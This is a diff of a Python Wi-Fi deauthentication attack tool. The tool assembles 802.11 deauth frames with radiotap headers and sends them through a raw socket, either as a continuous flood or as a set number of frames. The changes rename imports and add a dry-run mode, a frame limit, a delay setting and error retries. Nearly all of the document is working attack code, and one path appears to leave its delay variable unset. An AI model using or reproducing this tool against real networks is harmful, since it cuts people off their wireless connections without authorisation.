@@ -17,13 +17,13 @@
 # along with this program. If not, see <https://www.gnu.org/licenses/>.
 
 # not all these imports are used in the final code, they are here until I determine exactly which file they will be used in
-import socket  # Low-level networking with raw sockets
-import okeusarguments # Parsing command-line arguments from arguments.py
-import convert # MAC address conversion from convert.py
-import reason # Handles reason codes
-import rt # Adds radio tap header 
-import os # Used for ensuring permissions are set
-import struct  # Unpacking binary data (e.g., network headers)
+import socket
+import okeusargs
+import convert
+import reason
+import radio
+import os
+import struct
 import sys 
 import random
 import time
@@ -54,16 +54,16 @@ def f_assem(args):
 
     # handle all illogical arguments
     if (broadcast_attack or timedelay or frame_flood or num_frames or
-    frag or seq_num or reason or dur_of_attack) and not (dest_mac or broadcast_attack):
+    frag or seq_num or reason or dur) and not (dest_mac or broadcast_attack):
         print("Error: target input required") # requires target input for most operations
         exit(1)
     if (broadcast_attack or timedelay or frame_flood or num_frames or
-    frag or seq_num or reason or dur_of_attack) and not network_bssid:
+    frag or seq_num or reason or dur) and not network_bssid:
         print("Error: network BSSID required") # requires network BSSID for most operations
         exit(1)
-    if frame_flood and (num_frames or timedelay or dur_of_attack):
-        print("Error: --flood requires no other arguments")
-        exit(1)
+    # if frame_flood and (num_frames or timedelay):
+    #     print("Error: --flood requires no other arguments")
+    #     exit(1)
     if broadcast_attack and dest_mac:
         print("Invalid arguments, too many addresses in Address 1")
         exit(1)
@@ -77,7 +77,7 @@ def f_assem(args):
     # second byte makeup of FCF
     if not (frag or randfrag):
         f_frag = struct.pack('B', 0x00)
-        ch = "PRESET"
+        ch = "DEFAULT"
     elif (frag or randfrag):
         f_frag = struct.pack('B', 0x20)
         if frag:
@@ -113,7 +113,7 @@ def f_assem(args):
     return f_ctl, f_frag, f_dur, ct, src, net, ch
 
 def main():
-    args = okeusarguments.parse_arguments()
+    args = okeusargs.parse_arguments()
 
     timedelay = args.delay
     frame_flood = args.flood
@@ -130,12 +130,11 @@ def main():
     reason_code = args.reason_code
     randfrag = args.randomfrag
     autoseq = args.autoseq
-    runtime = args.runtime
     dry = args.dryrun
 
     f_ctl, f_frag, f_dur, ct, src, net, ch = f_assem(args)
-    radio, vr, pad, rt_len, fp = rt.rt_head()
-    df = radio + f_ctl + f_frag + f_dur + ct + src + net
+    rad, vr, pad, rt_len, fp = radio.rt_head()
+    df = rad + f_ctl + f_frag + f_dur + ct + src + net
 
     def reas():
         # Body
@@ -183,6 +182,7 @@ def main():
 
     def verb():
         seq = fs()
+        print("-" * 100)
         print(f"{'Frame composition'.center(100)}")
         print("-" * 100)
         print(f"Radiotap version: {vr.hex()}")
@@ -205,28 +205,22 @@ def main():
             print(f"Sequence Control: {seq.hex().upper()}")
         if (autoseq or randfrag):
             print("Sequence Control: DYNAMIC")
-        # if not randfrag:
-        #     print(f"Fragmentation: {frag}")
-        # if randfrag:
-        #     print("Fragmentaiton: RANDOM")
-        # if not autoseq:
-        #     print(f"Sequence Control: {((seq_num << 4) & 0xFFF0)}")
-        # if autoseq:
-        #     print("Sequence Control: AUTOMATIC")
         if not reason_code:
             print(f"Reason Code: {reason.def_code(0)}")
         if reason_code:
             print(f"Reason Code: {reason.def_code(reason_code)}")
         print("-" * 100)
 
+    if not dry:
     # Open the socket
-    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
-    s.bind((interface, 0))
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+        s.bind((interface, 0))
 
     r = reas()
 
     if frame_flood:
         nmframe = 1
+
         if verbose:
             verb()
         try:
@@ -234,27 +228,46 @@ def main():
             tgt = ''.join([f'\\x{tg[i:i+2]}' for i in range(0, len(tg), 2)])
             print("Starting deauth attack")
             print(f"Flooding: {tgt}\nInterrupt with CTRL + C")
-            while True:
-                sq = fs()
-                frame = df + sq + r
-                s.send(frame)
-                time.sleep(.15)
-                nmframe += 1
+            if num_frames:
+                n = num_frames
+                print(f"Sending {n} frames.")
+            elif not num_frames:
+                n = -1
+
+            if timedelay:
+                t = timedelay / 1000
+                print(f"Delay of {timedelay} ms")
+            elif not timedelay:
+                t = .1
+            while nmframe != n:
+                try:
+                    sq = fs()
+                    frame = df + sq + r
+                    if not dry:
+                        s.send(frame)
+                    time.sleep(t)
+                    nmframe += 1
+                except OSError as e:
+                    if e.errno == 100:
+                        time.sleep(1)
+                        continue
         except KeyboardInterrupt:
             print("\nEnding flood attack")
+
         except Exception as e:
             print(f"Error: {e}")
+
         finally:
             print(f"Sent {nmframe} frames to {tgt}")
-            s.close()
+            if not dry:
+                s.close()
 
     if not frame_flood:
         if timedelay:
             t = timedelay / 1000
             ti = timedelay
         if not timedelay:
-            ti = 1
-            t = ti / 1000
+            ti = 0
         if num_frames:
             n = num_frames
         if not num_frames:
@@ -262,31 +275,38 @@ def main():
         try:
             if verbose:
                 verb()
+            if timedelay:
+                print(f"Sending {n} frames at a rate of {ti} ms.")
             print("Starting deauth attack")
-            print(f"Sending {n} frames at a rate of {ti} ms.")
             for i in range(n):
-                sq = fs()
-                frame = df + sq + r
-                s.send(frame)
-                if verbose:
-                    print(f"Sending frame: {i + 1}/{n}")
-                    frme = frame.hex().upper()
-                    frmes = ''.join([f'\\x{frme[i:i+2]}' for i in range(0, len(frme), 2)])
-                    print(frmes)
-                    if ti < 1000:
-                        print(f"Waiting {ti} ms...")
-                    elif ti >= 1000:
-                        print(f"Waiting {ti / 1000} second(s)...")
-                    print(t)
-                time.sleep(t)
+                try:
+                    sq = fs()
+                    frame = df + sq + r
+                    if not dry:
+                        s.send(frame)
+                    if verbose:
+                        print(f"Sending frame: {i + 1}/{n}")
+                        frme = frame.hex().upper()
+                        frmes = ''.join([f'\\x{frme[i:i+2]}' for i in range(0, len(frme), 2)])
+                        print(frmes)
+                        if timedelay:
+                            if ti < 1000:
+                                print(f"Waiting {ti} ms...")
+                            elif ti >= 1000:
+                                print(f"Waiting {ti / 1000} second(s)...")
+                    time.sleep(t)
+                except OSError as e:
+                    if e.errno == 100:
+                        time.sleep(1)
+                        continue
         except KeyboardInterrupt:
             print("\n")
-            exit(1)
         except Exception as e:
             print(f"Error: {e}")
         finally:
             print("Completed!!!")
-            s.close()
+            if not dry:
+                s.close()
 
 if __name__ == "__main__":
     main()
